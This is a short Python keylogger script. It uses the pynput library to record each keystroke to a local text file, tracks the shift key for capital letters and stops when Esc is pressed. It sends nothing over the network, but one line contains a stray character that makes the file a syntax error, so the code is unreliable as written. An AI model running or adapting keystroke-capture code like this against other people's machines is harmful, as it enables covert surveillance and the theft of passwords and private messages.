from pynput import keyboard

file_name = "text.txt"
current_keys = set()  # To track modifier keys

def on_press(key):
    try:
        global current_keys
        current_keys.add(key)

        with open(file_name, "a", encoding="utf-8") as f:
            if key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.space:
                f.write(" ")Z 

            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            elif hasattr(key, 'char') and key.char is not None:
                # Handle shift for uppercase letters
                if keyboard.Key.shift in current_keys or keyboard.Key.shift_r in current_keys:
                    f.write(key.char.upper())
                else:
                    f.write(key.char)
            elif key == keyboard.Key.esc:
                return False  # Stop listener
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_release(key):
    global current_keys
    if key in current_keys:
        current_keys.remove(key)

# Start the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

